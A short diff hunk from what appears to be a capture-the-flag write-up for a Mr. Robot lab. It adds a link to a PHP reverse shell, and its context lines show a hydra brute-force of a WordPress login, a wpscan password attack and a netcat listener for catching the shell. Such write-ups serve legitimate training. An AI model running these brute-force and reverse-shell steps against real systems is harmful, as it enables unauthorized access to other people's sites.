@@ -36,8 +36,8 @@ hydra -l elliot -P fsocity.dic $IP_ADDR http-post-form "/wp-login.php:log=^USER^
 ```bash
 wpscan --url http://${IP_ADDR} --passwords fsocity.dic --usernames Elliot  
 ```
-
 ### How to reverse shell
+https://github.com/pentestmonkey/php-reverse-shell
 ```bash
 nc -lvnp 53
 ```
